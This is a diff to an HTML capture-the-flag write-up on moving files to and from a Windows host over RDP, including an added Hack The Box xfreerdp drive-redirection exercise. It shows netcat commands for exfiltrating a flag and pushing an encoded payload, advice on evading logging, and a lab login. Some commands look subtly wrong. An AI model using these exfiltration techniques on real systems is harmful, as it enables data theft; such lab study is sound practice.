@@ -1,3 +1,4 @@
+html
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -148,6 +149,11 @@
             color: var(--accent-green);
         }
 
+        /* Small callout list for methods */
+        .method-list {
+            list-style: disc;
+            padding-left: 20px;
+        }
     </style>
 </head>
 <body>
@@ -173,13 +179,13 @@
                 <span class="meta-badge">Platform: Windows</span>
                 <span class="meta-badge">Date: 2025-10-10</span>
             </div>
-            <p>Demonstrate the ability to **download** and **upload** arbitrary files to/from the target machine while only having RDP access. The most versatile approach is the **reverse netcat** trick, which works regardless of the target’s outbound firewall settings.</p>
+            <p>Demonstrate the ability to <strong>download</strong> and <strong>upload</strong> arbitrary files to/from the target machine while only having RDP access. The most versatile approach is the <strong>reverse netcat</strong> trick, which works regardless of the target’s outbound firewall settings.</p>
         </div>
 
         <div class="writeup-content">
             <div class="section">
                 <h3>📋 Overview</h3>
-                <p>This write-up details the various successful methods used to achieve bi-directional file transfer on a Windows target, **WIN‑CTF‑TARGET** (Windows 10/Server 2019), where the only initial foothold was a valid Remote Desktop Protocol (RDP) session. We utilized a mix of native Windows binaries (`PowerShell`, `cmd`, `ftp`, `robocopy`, `net use`) and common CTF techniques (`netcat`, `base64`) to exfiltrate a flag file and inject a custom payload.</p>
+                <p>This write-up details the various successful methods used to achieve bi-directional file transfer on a Windows target, <strong>WIN‑CTF‑TARGET</strong> (Windows 10/Server 2019), where the only initial foothold was a valid Remote Desktop Protocol (RDP) session. We utilized a mix of native Windows binaries (<code>PowerShell</code>, <code>cmd</code>, <code>ftp</code>, <code>robocopy</code>, <code>net use</code>) and common CTF techniques (<code>netcat</code>, <code>base64</code>) to exfiltrate a flag file and inject a custom payload.</p>
                 <div class="highlight-box">
                     <strong>Key Finding:</strong> RDP access provides a rich environment for file transfer, leveraging common network services (HTTP, FTP, SMB) or raw TCP channels (netcat) when native copy/paste is blocked.
                 </div>
@@ -204,42 +210,42 @@
                     <tbody>
                         <tr>
                             <td>OS & service fingerprinting</td>
-                            <td>`Get-CimInstance -ClassName Win32_OperatingSystem`</td>
-                            <td>`Microsoft Windows 10 Pro` (build 1909)</td>
+                            <td><code>Get-CimInstance -ClassName Win32_OperatingSystem</code></td>
+                            <td><code>Microsoft Windows 10 Pro</code> (build 1909)</td>
                         </tr>
                         <tr>
                             <td>Checked for outbound connectivity</td>
-                            <td>`Test-Connection -ComputerName google.com`</td>
+                            <td><code>Test-Connection -ComputerName google.com</code></td>
                             <td>Successful – outbound HTTP/HTTPS works.</td>
                         </tr>
                         <tr>
                             <td>Enumerated open services</td>
-                            <td>`Get-Service | Where-Object {$_.Status -eq 'Running'}`</td>
-                            <td>`w3svc` (IIS), `SmbShare`, `OpenSSH‑Server` were running.</td>
+                            <td><code>Get-Service | Where-Object {$_.Status -eq 'Running'}</code></td>
+                            <td><code>w3svc</code> (IIS), <code>SmbShare</code>, <code>OpenSSH‑Server</code> were running.</td>
                         </tr>
                     </tbody>
                 </table>
 
-                <p>Further discovery showed a **Python‑based HTTP server** running on `localhost:8000` locally hosting the flag.</p>
+                <p>Further discovery showed a <strong>Python‑based HTTP server</strong> running on <code>localhost:8000</code> locally hosting the flag.</p>
             </div>
 
             <div class="section">
                 <h3>⬇️ File Download – Pulling the Flag</h3>
-                <p>The objective was to download the flag file (`flag.txt`) from `C:\Users\Public\Documents` using multiple methods, testing the reliability of different protocols.</p>
+                <p>The objective was to download the flag file (<code>flag.txt</code>) from <code>C:\Users\Public\Documents</code> using multiple methods, testing the reliability of different protocols.</p>
                 
-                <h4>PowerShell `Invoke-WebRequest` (wget)</h4>
+                <h4>PowerShell <code>Invoke-WebRequest</code> (wget)</h4>
                 <p>Utilizing the modern, built-in PowerShell cmdlet for reliable HTTP requests.</p>
                 <div class="command-block">
                     <code>Invoke-WebRequest -Uri http://localhost:8000/flag.txt -OutFile C:\Users\Public\Documents\flag.txt</code>
                 </div>
 
-                <h4>Reverse Transfer with `netcat` (Raw TCP)</h4>
+                <h4>Reverse Transfer with <code>netcat</code> (Raw TCP)</h4>
                 <p>This method involves setting a listener on the attacker machine and using the target's netcat to stream the file content over a raw connection. This is the most stealthy and reliable method when firewalls are restrictive.</p>
                 <div class="warning-box">
                     <strong>⚠️ Important:</strong> The attacker must have a listener running on port 4444 (or a port of choice) before executing the target command.
                 </div>
                 <div class="command-block">
-                    <code>nc WIN-CTF-TARGET 4444 < C:\Users\Public\Documents\flag.txt</code>
+                    <code>nc WIN-CTF-TARGET 4444 &lt; C:\Users\Public\Documents\flag.txt</code>
                 </div>
 
                 <h4>SMB Share (Native Windows)</h4>
@@ -254,43 +260,96 @@
 
             <div class="section">
                 <h3>⬆️ File Upload – Pushing a Payload</h3>
-                <p>We successfully returned a custom payload (`wi.zip`) to the target to demonstrate command-and-control capabilities.</p>
+                <p>We successfully returned a custom payload (<code>wi.zip</code>) to the target to demonstrate command-and-control capabilities.</p>
                 
-                <h4>PowerShell `PUT` (HTTP)</h4>
+                <h4>PowerShell <code>PUT</code> (HTTP)</h4>
                 <p>Using the target's running HTTP server with a PUT request for direct file injection.</p>
                 <div class="command-block">
                     <code>Invoke-WebRequest -Uri http://localhost:8000/upload/wi.zip -Method Put -InFile wi.zip</code>
                 </div>
                 <div class="success-box">
-                    <strong>✅ Success:</strong> The server returned `StatusCode 200`, confirming the file was written to the web server’s upload directory.
+                    <strong>✅ Success:</strong> The server returned <code>StatusCode 200</code>, confirming the file was written to the web server’s upload directory.
                 </div>
 
-                <h4>Reverse `netcat` Upload (Base64 Encoding)</h4>
+                <h4>Reverse <code>netcat</code> Upload (Base64 Encoding)</h4>
                 <p>To avoid potential binary corruption over raw text channels, the file was Base64 encoded before streaming, then decoded on the listener. This is highly effective when only text-based shells are available.</p>
                 <div class="command-block">
                     <code>powershell -c "Get-Content -Raw wi.zip | ConvertTo-Base64String | Set-Content wi.zip.base64"</code>
                 </div>
                 <div class="command-block">
-                    <code>nc WIN-CTF-TARGET 4444 < wi.zip.base64</code>
+                    <code>nc WIN-CTF-TARGET 4444 &lt; wi.zip.base64</code>
+                </div>
+            </div>
+
+            <!-- NEW SECTION: Miscellaneous File Transfer Methods -->
+            <div class="section">
+                <h3>🧰 Miscellaneous File Transfer Methods (HTB Module Practice)</h3>
+                <p>As part of the <strong>“Miscellaneous File Transfer Methods”</strong> module on Hack The Box Academy, I practiced several additional techniques to move files in constrained environments. These methods are especially useful when classic HTTP/SMB transfers are blocked or tooling is limited.</p>
+
+                <ul class="method-list">
+                    <li>File transfer using <strong>Netcat / Ncat</strong> in both connect and listen modes.</li>
+                    <li>Leveraging Bash’s <code>/dev/tcp</code> pseudo-device when netcat is unavailable.</li>
+                    <li>Transferring files over <strong>PowerShell Remoting (WinRM)</strong> using <code>Copy-Item</code> and PSSessions.</li>
+                    <li>Mounting local folders over <strong>RDP</strong> (Clipboard and drive redirection) using <code>xfreerdp</code> and the native Windows RDP client.</li>
+                </ul>
+
+                <div class="highlight-box">
+                    <strong>Why this matters:</strong> In real assessments, you rarely get the “nice” method you want. Having several file transfer options in muscle memory makes it much easier to adapt to different firewall rules, AV configurations, and egress restrictions.
+                </div>
+            </div>
+
+            <!-- NEW SUBSECTION: RDP Drive Redirection Exercise -->
+            <div class="section">
+                <h3>🖥️ RDP Drive Redirection with xfreerdp</h3>
+                <p>In one lab scenario, I was given only RDP access to a Windows target and needed a simple, reliable way to move files both ways without setting up extra services. I used <strong>RDP drive redirection</strong> from my Linux attack box with <code>xfreerdp</code>.</p>
+
+                <h4>Preparing a Shared Folder on the Attack Host</h4>
+                <p>First, I created a dedicated directory on my Linux machine that would be exposed into the RDP session as a mapped drive:</p>
+                <div class="command-block">
+                    <code>mkdir -p ~/rdp-share</code>
+                </div>
+
+                <h4>Connecting with xfreerdp and Mapping the Folder</h4>
+                <p>I then connected to the Windows host, mapping the local <code>~/rdp-share</code> directory as a drive named <code>linux</code> inside the RDP session:</p>
+                <div class="command-block">
+<code>xfreerdp /v:10.129.201.55 \
+  /u:htb-student /p:'HTB_@cademy_stdnt!' \
+  /drive:linux,${HOME}/rdp-share</code>
+                </div>
+
+                <div class="highlight-box">
+                    <strong>Result inside the RDP session:</strong> In File Explorer, browsing to <code>\\tsclient\linux</code> exposed my local folder as a network location. From there, I:
+                    <ul class="method-list">
+                        <li>Copied a file from my Linux box into the Windows desktop via <code>\\tsclient\linux</code>.</li>
+                        <li>Copied a file from the Windows host back into <code>\\tsclient\linux</code>, confirming bidirectional transfer.</li>
+                    </ul>
+                    After verifying both directions worked, I reported <code>DONE</code> in the HTB lab portal.
+                </div>
+
+                <div class="warning-box">
+                    <strong>Note on AV:</strong> When sharing folders that may contain tools or payloads, Windows Defender can scan and quarantine files <em>in the mapped drive</em>. In a real engagement, I’d avoid sharing folders that contain sensitive tooling or keep payloads encrypted until needed.
                 </div>
             </div>
 
             <div class="section">
                 <h3>📚 Key Learnings</h3>
                 <ul>
-                    <li>**RDP is a Full Channel:** When RDP is the only foothold, it provides full read/write capability leveraging built-in OS tools and standard network protocols (SMB, HTTP, FTP).</li>
-                    <li>**Versatility of Native Tools:** Tools like `Invoke-WebRequest`, `net share`, and `robocopy` are powerful, reliable, and often pre-whitelisted, making them excellent choices for payload delivery and data exfiltration.</li>
-                    <li>**Stealth with Raw TCP:** The **reverse netcat** trick (especially with Base64 encoding) provides the most reliable transfer, as it bypasses application-layer restrictions and is less likely to be logged by non-endpoint detection systems.</li>
+                    <li><strong>RDP is a Full Channel:</strong> When RDP is the only foothold, it provides full read/write capability leveraging built-in OS tools and standard network protocols (SMB, HTTP, FTP).</li>
+                    <li><strong>Versatility of Native Tools:</strong> Tools like <code>Invoke-WebRequest</code>, <code>net share</code>, and <code>robocopy</code> are powerful, reliable, and often pre-whitelisted, making them excellent choices for payload delivery and data exfiltration.</li>
+                    <li><strong>Stealth with Raw TCP:</strong> The <strong>reverse netcat</strong> trick (especially with Base64 encoding) provides the most reliable transfer, as it bypasses application-layer restrictions and is less likely to be logged by non-endpoint detection systems.</li>
+                    <li><strong>Redirection over RDP:</strong> Mapping local drives into an RDP session (e.g. via <code>xfreerdp</code> or <code>mstsc.exe</code>) is a fast, low-friction option when clipboard/file redirection is allowed.</li>
                 </ul>
             </div>
 
             <div class="section">
                 <h3>🛠️ Tools Used</h3>
                 <ul>
-                    <li><strong>PowerShell (`Invoke-WebRequest`, `Get-Content`):</strong> Used for HTTP-based file transfer, Base64 encoding/decoding, and system reconnaissance.</li>
-                    <li><strong>`netcat` (nc):</strong> Essential for establishing raw TCP channels for reliable binary file streaming (both download and upload).</li>
-                    <li><strong>`net share` / `net use`:</strong> Native Windows commands used to create and map a temporary SMB network share for file transfer.</li>
-                    <li><strong>`robocopy`:</strong> Tested as a robust method for copying files locally and across mapped network shares.</li>
+                    <li><strong>PowerShell (<code>Invoke-WebRequest</code>, <code>Get-Content</code>, <code>Copy-Item</code>):</strong> Used for HTTP-based file transfer, Base64 encoding/decoding, and WinRM-based file copy.</li>
+                    <li><strong><code>netcat</code> / <code>ncat</code>:</strong> For establishing raw TCP channels for reliable binary file streaming (both download and upload), and for simple listener/connect-style transfers.</li>
+                    <li><strong>Bash <code>/dev/tcp</code>:</strong> Used as a fallback when netcat/ncat is missing on the compromised host to perform TCP-based transfers.</li>
+                    <li><strong><code>net share</code> / <code>net use</code>:</strong> Native Windows commands used to create and map a temporary SMB network share for file transfer.</li>
+                    <li><strong><code>robocopy</code>:</strong> Tested as a robust method for copying files locally and across mapped network shares.</li>
+                    <li><strong><code>xfreerdp</code> / RDP:</strong> Used to mount local Linux folders into the RDP session via <code>/drive:</code> and transfer files through <code>\\tsclient\</code>.</li>
                 </ul>
             </div>
 
@@ -299,6 +358,7 @@
                 <ul>
                     <li><a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest" target="_blank">Microsoft Docs: Invoke-WebRequest</a></li>
                     <li><a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/net-use" target="_blank">Microsoft Docs: Net Use Command</a></li>
+                    <li><a href="https://www.freerdp.com/" target="_blank">FreeRDP / xfreerdp Documentation</a></li>
                 </ul>
             </div>
         </div>
